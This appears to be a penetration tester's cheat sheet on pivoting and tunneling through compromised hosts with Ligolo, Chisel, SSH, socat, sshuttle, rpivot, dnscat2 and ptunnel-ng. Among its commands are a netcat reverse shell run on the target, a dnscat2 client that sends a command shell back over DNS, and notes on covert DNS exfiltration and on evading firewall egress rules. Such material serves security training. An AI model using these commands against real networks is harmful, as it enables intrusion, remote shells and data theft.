## Port Tunneling & Redirection

#### Ligolo

Think of it as disguising your machine as the pivot machine in the eyes of the firewall. Favorite for tunnelling.

Scenarios.
- Use a service that is only available on the localhost of the target like RDP or web server.
- Transfer files from internal (through pivot) to attacker and vise versa.

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.201.0/24 dev ligolo # Discard 4th octect of victim machine's internal ip
ip route list
sudo ligolo-proxy -selfcert

./agent -connect 192.168.45.221:11601 -ignore-cert -retry # Target

session # select the session that you want to work with
1
start
listener_add --addr 0.0.0.0:3389 --to 127.0.0.1:3389
listener-list # confirm

.\nc.exe 172.16.157.14 1234 -e cmd.exe # On target machine to receive revshell
# If web server, access browser and/or direct attacks to localhost:port

# Great for transferring files when testing AD
listener_add --addr 0.0.0.0:1433 --to 172.10.121.15:1433 # If you need to use specific port for internal
```

You may need to create certificates:

```bash
mkdir -p ~/Downloads/certs
cd ~/Downloads/certs
openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
```

### Chisel

Scenarios.
- You compromised Confluence server, but only HTTP outbound traffic is allowed.
- A network administrator blocks all outbound SSH traffic, affecting SSH-based tunneling strategies.

Troubleshooting.
- Make sure versions are compatible.
- Ensure ip addresses are in the right locations

Using target's service that's only available on their localhost.

```bash
chisel server --reverse --port 51234 # Attacker
./chisel client $myip:51234 R:8443:127.0.0.1:8443 # Target
```

Masquerading as HTTP traffic.

```bash
chisel server --reverse --socks5 -p 8001 &> /tmp/output 
chisel server --port 8080 --reverse &> /tmp/output # For TCP Traffic

./chisel client 192.168.45.221:8001 R:socks # Client

socks5 127.0.0.1 8001 # sudo vi /etc/proxychains5.conf
proxychains ...
```

```bash
/tmp/chisel server --reverse --port 51234
/tmp/chisel client kali_ip:51234 R:50080:socks
```
---

#### Tunnel Web Traffic through Remote Computer

Tunneling your web traffic through another computer can be achieved using various methods, depending on your specific needs and the operating systems involved. One common approach is to set up an SSH tunnel. This method is secure and relatively straightforward if you have SSH access to the remote computer. Here’s how you can set up an SSH tunnel to route your web traffic through another computer:

#### Requirements:
- **SSH access** to the remote computer.
- **SSH client** installed on your local machine (Linux and macOS have this by default, Windows users can use PuTTY or enable the built-in SSH client).
- **Web browser** that allows proxy settings configuration (e.g., Firefox, Chrome).

#### Setting Up an SSH Tunnel

1. **Open your terminal** on your local machine.

2. **Create an SSH tunnel** by running the following command:
   ```bash
   ssh -D 8080 -C -q -N user@remote-computer
   ```
   - `-D 8080` specifies a local "dynamic" application-level port forwarding. This sets up a SOCKS proxy server on local port `8080`.
   - `-C` enables compression.
   - `-q` enables quiet mode.
   - `-N` tells SSH that no remote commands will be executed, and this is just for forwarding.
   - `user` is your username on the remote computer.
   - `remote-computer` is the IP address or hostname of the remote computer.

3. **Configure your web browser** to use the SOCKS proxy. This setup varies by browser:
   - **Firefox**:
     - Go to Preferences > General > Network Settings.
     - Select “Manual proxy configuration”.
     - Set “SOCKS Host” to `127.0.0.1` and the port to `8080`.
     - Choose SOCKS v5.
   - **Chrome**:
     - Chrome does not have built-in proxy settings, so you might need to use an extension like “Proxy SwitchyOmega” or configure system-wide proxy settings.

4. **Browse the internet**. Your web traffic will now be routed through the remote computer.

#### Additional Security Tips
- Ensure that your SSH server is secured with good practices, such as using key-based authentication and disabling password login.
- Regularly update both your local and remote machines to protect against vulnerabilities.

#### Troubleshooting
- If you cannot connect, check your SSH permissions, firewall rules, and whether the SSH service is running on the remote machine.
- Ensure the remote computer has a stable internet connection.

This setup is useful for secure browsing, bypassing regional restrictions, or keeping your browsing habits away from local snooping. For more advanced scenarios, consider setting up a VPN or using dedicated proxy software.

---

#### Local Forwarding

Binding local ports to dmz ones and using your local machine to act as the (accessible) remote machine.

#### Local Port Forwarding

Local port forwarding allows you to forward a port on the local machine to a remote server. This is useful for accessing a remote service as if it were running on your local machine.
- Access an internal database via a pivot machine, bypassing rules against direct external connections.
- Connect to an email server's local-only management interface, circumventing local access restrictions.
- Reach a DMZ server without direct connections, navigating DMZ-specific ingress rules.
- Bypass firewall blocks on remote ports to access restricted services.
- Transfer files to a non-directly accessible server, overcoming remote file transfer blocks.

Access remote HTTPS website that's on port 443.

```bash
ssh -N -L localhost:localPort:destinationServer:remotePort user@SSHserver
ssh -N -L 127.0.0.1:443:127.0.0.1:8443 web_admin@10.4.50.215
ssh -N -L 9000:localhost:8000 -i 245/id_ecdsa anita@192.168.196.246 -p 2222
```

Upload files to remote.

```bash
ssh -N -L 9000:dmz_ip:22 user@dmz_ip
scp -P 9000 local_backup_file.tar.gz localhost:/path/to/destination/
```

Download files from remote.

```bash
ssh -L 9001:internal_server:22 user@pivot_machine # Download files from remote
scp -P 9001 localhost:/path/to/config_file.conf /local/path/ 
```


### Local Dynamic Port Forwarding

Allows you to create a SOCKS proxy server on the local machine, which can be used to forward requests dynamically to multiple destinations.

- Use the dynamic port forwarding to scan multiple ports on a target network without setting up individual port forwards for each.
- Access multiple services on different ports and different servers through a single local SOCKS proxy.

```bash
ssh -fND 0.0.0.0:9999 database_admin@10.4.50.215
socks4 127.0.0.1 9999 # Edit /etc/proxychains4.conf
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

```bash
chisel server --reverse --port 51234 # Attacker, make sure this port is open in the firewall
/tmp/chisel client kali_ip:51234 50080:socks
```

#### Remote Forwarding

Using a pivot machine as a middle man.

Scenarios.
- Internal AD environment is shut off to you, use your compromised machine as a pivot to dig further.
- Transfer files from internal to attacker through pivot.

#### Remote Port Forwarding

Remote port forwarding allows you to forward a port on the remote server to a local machine. This is useful for exposing local services to a remote network.

- Expose an internal web server via a remote pivot.
- Strict firewall egress doesn't allow traffic in or out of 1433 outside of the network.
- Provide remote access to a local file server, overcoming local network file access restrictions.

```bash
chisel server --reverse --port 5000
/tmp/chisel client kali_ip:5000 R:443:127.0.0.1:443 R:8443:127.0.0.1:8443
curl localhost:8443 # On attacker machine
```

```bash
ssh -N -R remotePort:localServer:localPort kali@$myip # On pivot machine
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
psql -h 127.0.0.1 -p 2345 -U postgres # Now access PostgreSQL via Local Port
```

Upload files to internal.

```bash
ssh -R 9002:localhost:22 user@internal_ip # Execute commands on pivot machine
scp -P 9002 update_package.zip internal_user@localhost:/path/to/internal_folder/
```

### Remote Dynamic Port Forwarding

Remote dynamic port forwarding allows setting up a SOCKS proxy on a remote server to dynamically forward traffic from the remote server to multiple destinations.

- Internal AD environment is shut off to you, use your compromised machine as a pivot to dig further.
- Access services across remote networks, bypassing direct internet exposure rules.
- Perform network monitoring from afar, avoiding restrictions on external monitoring tools.

```bash
ssh -N -R remotePort:localServer:localPort kali@$myip # On pivot machine
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
psql -h 127.0.0.1 -p 2345 -U postgres # Now access PostgreSQL via Local Port
```

### Port Redirection with Socat

Scenario.
- Redirect traffic from an external-facing port to an internal service.

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 # Victim
ssh database_admin@192.168.50.63 -p2222
```

### Using Browser with Proxychains

Configure Proxychains

```bash
socks4 127.0.0.1 9050 # Edit /etc/proxychains.conf
proxychains firefox
```

### DNS Tunneling

Scenarios.
- Sending data out of a network covertly via DNS queries.
- Sending data into a network covertly via DNS responses.

#### Basic Usage

```bash
dnscat2-server <YOUR_DOMAIN> # Attacker
./dnscat <YOUR_DOMAIN> # Target
```

#### Network Monitoring

```bash
tcpdump -i eth0 'tcp port 80' # Monitor HTTP Traffic
tcpdump -i eth0 'udp port 53' # Monitor DNS Queries
```

#### Resourcess

[Ligolo](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)
[Port Forwarding](https://github.com/twelvesec/port-forwarding)

```bash
ifconfig # Linux-based command that displays all current network configurations of a system.
ipconfig # Windows-based command that displays all system network configurations.
netstat -r # Command used to display the routing table for all IPv4-based protocols.
nmap -sT -p22,3306 <IPaddressofTarget> # Nmap command used to scan a target for open ports allowing SSH or MySQL connections.
ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget> # SSH comand used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.
netstat -antp \| grep 1234 # Netstat option used to display network connections associated with a tunnel created. Using grep to filter based on local port 1234 .
nmap -v -sV -p1234 localhost # Nmap command used to scan a host through a connection that has been made on local port 1234.
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget> # SSH command that instructs the ssh client to request the SSH server forward all data via port 1234 to localhost:3306.
ssh -D 9050 ubuntu@<IPaddressofTarget> # SSH command used to perform a dynamic port forward on port 9050 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.
tail -4 /etc/proxychains.conf # Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.
proxychains nmap -v -sn 172.16.5.1-200 # Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range 172.16.5.1-200 with increased verbosity (-v) disabling ping scan (-sn).
proxychains nmap -v -Pn -sT 172.16.5.19 # Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (-v), disabling ping discover (-Pn), and using TCP connect scan type (-sT).
proxychains msfconsole # Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/ # Uses secure copy protocol (scp) to transfer the file backupscript.exe to the specified host and places it in the Ubuntu user's home directory (:~/).
python3 -m http.server 8123 # Uses Python3 to start a simple HTTP server listening on port 8123. Can be used to retrieve files from a host.
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe" # PowerShell command used to download a file called backupscript.exe from a webserver (172.16.5.129:8123) and then save the file to location specified after -OutFile.
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN # SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target.
for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done # For Loop used on a Linux-based system to discover devices in a specified network segment.
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply" # For Loop used on a Windows-based system to discover devices in a specified network segment.
1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"} # PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.
socks4 127.0.0.1 9050 # Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.
Socks5 127.0.0.1 1080 # Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.
xfreerdp /v:localhost:3300 /u:victor /p:pass@123 # Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.
netstat -antp # Used to display all (-a) active network connections with associated process IDs. -t displays only TCP connections.-n displays only numerical addresses. -p displays process IDs associated with each displayed connection.
socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80 # Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.
socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443 # Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.
plink -D 9050 ubuntu@<IPaddressofTarget> # Windows-based command that uses PuTTYs Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.
sudo apt-get install sshuttle # Uses apt-get to install the tool sshuttle.
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v # Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (172.16.5.0).
sudo git clone https://github.com/klsecservices/rpivot.git # Clones the rpivot project GitHub repository.
sudo apt-get install python2.7 # Uses apt-get to install python2.7.
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0 # Used to run the rpivot server (server.py) on proxy port 9050, server port 9999 and listening on any IP address (0.0.0.0).
scp -r rpivot ubuntu@<IPaddressOfTarget> # Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999 # Used to run the rpivot client (client.py) to connect to the specified rpivot server on the appropriate port.
proxychains firefox-esr <IPaddressofTargetWebServer>:80 # Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password> # Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25 # Windows-based command that uses netsh.exe to configure a portproxy rule called v4tov4 that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.
netsh.exe interface portproxy show v4tov4 # Windows-based command used to view the configurations of a portproxy rule called v4tov4.
git clone https://github.com/iagox86/dnscat2.git # Clones the dnscat2 project GitHub repository.
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache # Used to start the dnscat2.rb server running on the specified IP address, port (53) & using the domain inlanefreight.local with the no-cache option enabled.
git clone https://github.com/lukebaggett/dnscat2-powershell.git # Clones the dnscat2-powershell project Github repository.
Import-Module dnscat2.ps1 # PowerShell command used to import the dnscat2.ps1 tool.
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd # PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (-Exec cmd).
dnscat2> ? # Used to list dnscat2 options.
dnscat2> window -i 1 # Used to interact with an established dnscat2 session.
./chisel server -v -p 1234 --socks5 # Used to start a chisel server in verbose mode listening on port 1234 using SOCKS version 5.
./chisel client -v 10.129.202.64:1234 socks # Used to connect to a chisel server at the specified IP address & port using socks.
git clone https://github.com/utoni/ptunnel-ng.git # Clones the ptunnel-ng project GitHub repository.
sudo ./autogen.sh # Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.
sudo ./ptunnel-ng -r10.129.202.64 -R22 # Used to start the ptunnel-ng server on the specified IP address (-r) and corresponding port (-R22).
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22 # Used to connect to a specified ptunnel-ng server through local port 2222 (-l2222).
ssh -p2222 -lubuntu 127.0.0.1 # SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.
regsvr32.exe SocksOverRDP-Plugin.dll # Windows-based command used to register the SocksOverRDP-PLugin.dll.
netstat -antb \|findstr 1080 # Windows-based command used to list TCP network connections listening on port 1080.
```